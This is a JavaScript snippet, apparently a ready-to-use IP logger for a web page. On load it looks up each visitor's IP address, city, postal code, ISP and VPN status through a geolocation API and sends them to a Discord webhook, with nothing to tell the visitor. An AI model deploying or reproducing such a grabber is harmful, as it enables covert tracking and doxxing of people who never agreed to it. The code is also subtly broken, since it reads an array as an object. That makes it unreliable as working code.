

// Set Variables and Customize Webhook here:
var items = [
    {
        "links": {
            "GeoLocationAPI": "", // API Link - From https://www.abstractapi.com/ip-geolocation-api
            "WebhookLink": "" // Where webhook is sent to - EXAMPLE: https://discord.com/api/webhooks/[code]
        },
        "discordParams": {
            "WebhookAvatarLink": "", // Avatar of the Webhook
            "WebhookDisplayName": "Logger", // Name of the Webhook
            "WebhookContent": "Ding." // Placeholder (Not needed to change)
        }
    }
]
// DO NOT RECOMMEND CHANGE ANYTHING HERE 
// Unless you know how to edit Abstract API and understand basic JS, please do not touch this code:
  var RewrittenParams = {username: items.discordParams.WebhookDisplayName,avatar_url: items.discordParams.WebhookAvatarLink,content: items.discordParams.WebhookContent}
  $.getJSON(items.links.GeoLocationAPI, function(api) {
    if(api.security.is_vpn == true) {var vpntrueorfalse = "User may have accessed through a Vpn."} else var vpntrueorfalse =" " // Check for VPN
    RewrittenParams.content = `${api.ip_address} accessed server from ${api.country_code}, ${api.city} - ${api.state} (Postal: ${api.postal_code}) at ${api.timezone.current_time} ${api.timezone.abbreviation}\n
    Connecting from: \`${api.connection.isp_name} ISP, Type: ${api.connection.connection_type} / Org: ${api.connection.autonomous_system_organization}\`\n ${vpntrueorfalse}`
    var request = new XMLHttpRequest();
          request.open("POST", items.links.WebhookLink); // Webhook Link
          request.setRequestHeader('Content-type', 'application/json');
          request.send(JSON.stringify(RewrittenParams));
          document.getElementById("status").innerHTML = "Webhook Delivered"; // Sucess Message
  })
